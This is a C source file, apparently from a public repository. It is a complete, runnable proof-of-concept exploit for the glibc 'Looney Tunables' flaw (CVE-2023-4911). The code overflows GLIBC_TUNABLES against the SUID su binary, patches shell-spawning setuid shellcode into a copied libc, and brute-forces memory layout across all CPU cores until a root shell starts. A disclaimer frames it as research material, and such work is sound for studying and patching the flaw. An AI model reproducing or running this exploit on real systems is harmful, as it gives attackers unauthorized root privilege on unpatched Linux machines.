/*
 * CVE-2023-4911 (Looney Tunables) - Optimized PoC
 *
 * Copyright (c) 2026 Anastasia Shebalkina
 * Repository: https://github.com/jarpex/cve-2023-4911-exploit-optimized
 *
 * DISCLAIMER:
 * This source code is provided for educational and security research
 * purposes only. It demonstrates the mechanics of a known, patched
 * vulnerability (CVE-2023-4911). Unauthorized access to computer
 * systems is illegal. The author is not responsible for any misuse
 * of this code.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <elf.h>
#include <signal.h>
#include <gnu/libc-version.h>

#define FILL_SIZE 0xd00
#define BOF_SIZE 0x600

struct exploit_state
{
    volatile int success;
    volatile long attempts;
    volatile long crashes;
};

int64_t time_us(void)
{
    struct timespec tms;
    if (clock_gettime(CLOCK_REALTIME, &tms))
    {
        return -1;
    }
    int64_t micros = tms.tv_sec * 1000000;
    micros += tms.tv_nsec / 1000;
    if (tms.tv_nsec % 1000 >= 500)
    {
        ++micros;
    }
    return micros;
}

// ==========================================
// 0. VULNERABILITY CHECKER (Fail Fast)
// ==========================================
int check_vulnerability(void)
{
    const char *version = gnu_get_libc_version();
    printf("[*] Detected glibc version: %s\n", version);
    printf("[*] Running silent vulnerability trigger (su --help)...\n");

    char *z_buf = malloc(8200);
    if (!z_buf)
    {
        perror("malloc");
        return 0;
    }
    strcpy(z_buf, "Z=");
    memset(z_buf + 2, '0', 8191);
    z_buf[2 + 8191] = '1';
    z_buf[2 + 8192] = '\0';

    char *trig_envp[] = {
        "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=",
        z_buf,
        NULL};
    char *trig_argv[] = {"/usr/bin/su", "--help", NULL};

    pid_t pid = fork();
    if (pid == 0)
    {
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull != -1)
        {
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        execve(trig_argv[0], trig_argv, trig_envp);
        _exit(1); // CRITICAL: _exit instead of exit
    }
    else if (pid > 0)
    {
        int status;
        waitpid(pid, &status, 0);
        free(z_buf);

        if (WIFSIGNALED(status))
        {
            int sig = WTERMSIG(status);
            printf("[+] VULNERABLE! Target crashed with signal %d (%s).\n", sig, strsignal(sig));
            return 1;
        }
        else if (WIFEXITED(status))
        {
            printf("[-] NOT VULNERABLE. Target exited normally with code %d.\n", WEXITSTATUS(status));
            return 0;
        }
    }
    else
    {
        perror("fork");
        free(z_buf);
    }
    return 0;
}

// ==========================================
// 1. ELF PARSER
// ==========================================
off_t find_sym_offset(const char *path, const char *sym_name)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0)
    {
        return -1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0)
    {
        close(fd);
        return -1;
    }

    uint8_t *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    if (map == MAP_FAILED)
    {
        return -1;
    }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
    {
        munmap(map, st.st_size);
        return -1;
    }

    Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
    Elf64_Shdr *shdr = (Elf64_Shdr *)(map + ehdr->e_shoff);
    char *shstrtab = (char *)(map + shdr[ehdr->e_shstrndx].sh_offset);

    Elf64_Shdr *dynsym = NULL, *dynstr = NULL;
    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        if (strcmp(shstrtab + shdr[i].sh_name, ".dynsym") == 0)
        {
            dynsym = &shdr[i];
        }
        if (strcmp(shstrtab + shdr[i].sh_name, ".dynstr") == 0)
        {
            dynstr = &shdr[i];
        }
    }
    if (!dynsym || !dynstr)
    {
        munmap(map, st.st_size);
        return -1;
    }

    Elf64_Sym *syms = (Elf64_Sym *)(map + dynsym->sh_offset);
    char *strs = (char *)(map + dynstr->sh_offset);

    off_t vaddr = 0;
    for (size_t i = 0; i < dynsym->sh_size / sizeof(Elf64_Sym); i++)
    {
        if (strcmp(strs + syms[i].st_name, sym_name) == 0)
        {
            vaddr = syms[i].st_value;
            break;
        }
    }
    if (!vaddr)
    {
        munmap(map, st.st_size);
        return -1;
    }

    off_t file_offset = 0;
    for (int i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_LOAD)
        {
            if (vaddr >= phdr[i].p_vaddr && vaddr < phdr[i].p_vaddr + phdr[i].p_memsz)
            {
                file_offset = vaddr - phdr[i].p_vaddr + phdr[i].p_offset;
                break;
            }
        }
    }
    munmap(map, st.st_size);
    return file_offset;
}

// ==========================================
// 2. PATCHER & ENV PREPARATION
// ==========================================
static const uint8_t SHELLCODE[] =
    "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"     // xor rdi, rsi, rdx
    "\x6a\x71\x58\x0f\x05"                     // push 113 (setreuid), pop rax, syscall
    "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"     // xor rdi, rsi, rdx
    "\x6a\x75\x58\x0f\x05"                     // push 117 (setresuid), pop rax, syscall
    "\x48\x31\xd2\x52"                         // xor rdx, rdx; push rdx
    "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00" // movabs rdi, "/bin/sh\0"
    "\x57\x48\x89\xe7\x52\x57\x48\x89\xe6"     // push rdi, mov rdi, rsp, push rdx, push rdi, mov rsi, rsp
    "\xb0\x3b\x0f\x05";                        // mov al, 59 (execve), syscall

static const char *PATCH_TARGETS[] = {"__libc_start_main", "__libc_csu_init", "malloc", NULL};

int prepare_exploit_env(void)
{
    const char *libc_paths[] = {"/lib/x86_64-linux-gnu/libc.so.6", "/lib64/libc.so.6", "/lib/libc.so.6", NULL};
    const char *su_path = "/usr/bin/su";

    struct stat su_st;
    if (stat(su_path, &su_st) < 0)
    {
        printf("[-] Cannot stat %s: %s\n", su_path, strerror(errno));
        return -1;
    }
    if (!(su_st.st_mode & S_ISUID))
    {
        printf("[-] %s is not SUID.\n", su_path);
        return -1;
    }
    printf("[+] %s is SUID root. Good.\n", su_path);

    off_t offset = -1;
    const char *target_libc = NULL;
    const char *patched_sym = NULL;

    printf("[*] Searching for system libc.so.6...\n");
    for (int i = 0; libc_paths[i]; i++)
    {
        if (access(libc_paths[i], F_OK) == 0)
        {
            target_libc = libc_paths[i];
            for (int j = 0; PATCH_TARGETS[j]; j++)
            {
                offset = find_sym_offset(target_libc, PATCH_TARGETS[j]);
                if (offset != -1)
                {
                    patched_sym = PATCH_TARGETS[j];
                    printf("[+] Found %s at offset: 0x%lx in %s\n", patched_sym, (unsigned long)offset, target_libc);
                    break;
                }
            }
            if (offset != -1)
            {
                break;
            }
        }
    }

    if (offset == -1)
    {
        printf("[-] Failed to find patchable symbol.\n");
        return -1;
    }

    int fd = open(target_libc, O_RDONLY);
    if (fd < 0)
    {
        perror("[-] open system libc");
        return -1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0)
    {
        perror("fstat");
        close(fd);
        return -1;
    }

    uint8_t *buf = malloc(st.st_size);
    if (!buf)
    {
        perror("malloc");
        close(fd);
        return -1;
    }

    if (read(fd, buf, st.st_size) != (ssize_t)st.st_size)
    {
        perror("read system libc");
        free(buf);
        close(fd);
        return -1;
    }
    close(fd);

    if ((size_t)offset + sizeof(SHELLCODE) > (size_t)st.st_size)
    {
        printf("[-] Shellcode doesn't fit at offset 0x%lx\n", (unsigned long)offset);
        free(buf);
        return -1;
    }

    memcpy(buf + offset, SHELLCODE, sizeof(SHELLCODE) - 1);

    if (unlink("./libc.so.6") < 0 && errno != ENOENT)
    {
        printf("[-] Cannot remove old ./libc.so.6: %s\n", strerror(errno));
        free(buf);
        return -1;
    }

    int out_fd = open("./libc.so.6", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out_fd < 0)
    {
        perror("[-] open ./libc.so.6 for writing");
        free(buf);
        return -1;
    }

    if (write(out_fd, buf, st.st_size) != (ssize_t)st.st_size)
    {
        perror("[-] write patched libc");
        close(out_fd);
        free(buf);
        return -1;
    }
    close(out_fd);
    free(buf);
    printf("[+] Patched libc.so.6 saved (patched %s).\n", patched_sym);

    mkdir("\"", 0755);
    int sfd = open("./libc.so.6", O_RDONLY);
    if (sfd < 0)
    {
        perror("open libc for copying to trap");
        return -1;
    }

    int dfd = open("\"/libc.so.6", O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (dfd < 0)
    {
        perror("open trap libc");
        close(sfd);
        return -1;
    }

    char rbuf[0x1000];
    int len;
    while ((len = read(sfd, rbuf, sizeof(rbuf))) > 0)
    {
        write(dfd, rbuf, len);
    }
    close(sfd);
    close(dfd);
    printf("[+] Trap directory created.\n");
    return 0;
}

// ==========================================
// 3. MAIN & MULTI-THREADED BRUTE-FORCE
// ==========================================
int main(void)
{
    setbuf(stdout, NULL); // CRITICAL: Unbuffered stdout for clean TTY handover

    // CRITICAL: Disable core dumps to prevent I/O lag on segfaults
    struct rlimit core_rlim = {0, 0};
    if (setrlimit(RLIMIT_CORE, &core_rlim) < 0)
    {
        perror("setrlimit CORE");
    }

    char filler[FILL_SIZE], kv[BOF_SIZE], filler2[BOF_SIZE + 0x20], dt_rpath[0x20000];
    char *argv[] = {"/usr/bin/su", "--help", NULL};
    char *envp[0x1000] = {NULL};

    printf("=== CVE-2023-4911 (Looney Tunables) Exploit ===\n\n");

    if (prepare_exploit_env() != 0)
    {
        return 1;
    }
    if (!check_vulnerability())
    {
        return 1;
    }

    strcpy(filler, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
    for (size_t i = strlen(filler); i < sizeof(filler) - 1; i++)
    {
        filler[i] = 'F';
    }
    filler[sizeof(filler) - 1] = '\0';

    strcpy(kv, "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=");
    for (size_t i = strlen(kv); i < sizeof(kv) - 1; i++)
    {
        kv[i] = 'A';
    }
    kv[sizeof(kv) - 1] = '\0';

    strcpy(filler2, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
    for (size_t i = strlen(filler2); i < sizeof(filler2) - 1; i++)
    {
        filler2[i] = 'F';
    }
    filler2[sizeof(filler2) - 1] = '\0';

    for (int i = 0; i < 0xfff; i++)
    {
        envp[i] = "";
    }
    for (size_t i = 0; i < sizeof(dt_rpath); i += 8)
    {
        *(uintptr_t *)(dt_rpath + i) = -0x14ULL;
    }
    dt_rpath[sizeof(dt_rpath) - 1] = '\0';

    envp[0] = filler;
    envp[1] = kv;
    envp[0x65] = "";
    envp[0x65 + 0xb8] = "\x30\xf0\xff\xff\xfd\x7f";
    envp[0xf7f] = filler2;
    for (int i = 0; i < 0x2f; i++)
    {
        envp[0xf80 + i] = dt_rpath;
    }
    envp[0xffe] = "AAAA";

    struct rlimit rlim = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_STACK, &rlim) < 0)
    {
        perror("setrlimit STACK");
    }

    printf("[*] Calibrating environment (20 runs)...\n");
    struct timespec start_ts, end_ts;
    long max_exec_time_us = 0;

    for (int i = 0; i < 20; i++)
    {
        clock_gettime(CLOCK_MONOTONIC, &start_ts);
        pid_t calib_pid = fork();
        if (calib_pid == 0)
        {
            execve(argv[0], argv, envp);
            _exit(1);
        }
        else
        {
            int wstatus;
            waitpid(calib_pid, &wstatus, 0);
            clock_gettime(CLOCK_MONOTONIC, &end_ts);
            long diff_us = (end_ts.tv_sec - start_ts.tv_sec) * 1000000 + (end_ts.tv_nsec - start_ts.tv_nsec) / 1000;
            if (diff_us > max_exec_time_us)
            {
                max_exec_time_us = diff_us;
            }
        }
    }

    long dynamic_delay_us = max_exec_time_us + (max_exec_time_us / 5) + 10000;
    printf("[+] Dynamic delay set to: %.2f ms\n", (float)dynamic_delay_us / 1000.0);

    struct exploit_state *state = mmap(NULL, sizeof(struct exploit_state), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (state == MAP_FAILED)
    {
        perror("mmap state");
        return 1;
    }
    state->success = 0;
    state->attempts = 0;
    state->crashes = 0;

    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores < 1)
    {
        cores = 2;
    }

    printf("\n[*] Starting brute-force on %d cores...\n", cores);
    time_t start_time = time(NULL);

    for (int i = 0; i < cores; i++)
    {
        if (fork() == 0)
        {
            // ---- Worker process ----
            while (!state->success)
            {
                __sync_fetch_and_add(&state->attempts, 1);
                pid_t pid = fork();
                if (pid == 0)
                {
                    execve(argv[0], argv, envp);
                    _exit(1);
                }
                else if (pid > 0)
                {
                    int wstatus;
                    usleep(dynamic_delay_us);
                    if (waitpid(pid, &wstatus, WNOHANG) == 0)
                    {
                        usleep(200000);
                        if (waitpid(pid, &wstatus, WNOHANG) == 0)
                        {
                            state->success = 1;
                            printf("\n\n[+] SUCCESS! Shell is running.\n");
                            waitpid(pid, &wstatus, 0);
                            _exit(0);
                        }
                    }
                    else if (waitpid(pid, &wstatus, WNOHANG) > 0)
                    {
                        __sync_fetch_and_add(&state->crashes, 1);
                    }
                }
                else
                {
                    perror("fork grandchild");
                    break;
                }
            }
            _exit(0);
        }
    }

    // ---- Parent process: monitor progress ----
    long last_attempts = 0;
    while (!state->success)
    {
        sleep(1);
        long current = state->attempts;
        printf("\r[*] Attempts: %ld | Speed: %ld/s | Elapsed: %.0fs | Crashes: %ld    ",
               current, current - last_attempts, difftime(time(NULL), start_time), state->crashes);
        last_attempts = current;
    }

    printf("\n\n[+] Exploit completed successfully!\n");
    for (int i = 0; i < cores; i++)
    {
        wait(NULL);
    }
    munmap(state, sizeof(struct exploit_state));
    return 0;
}
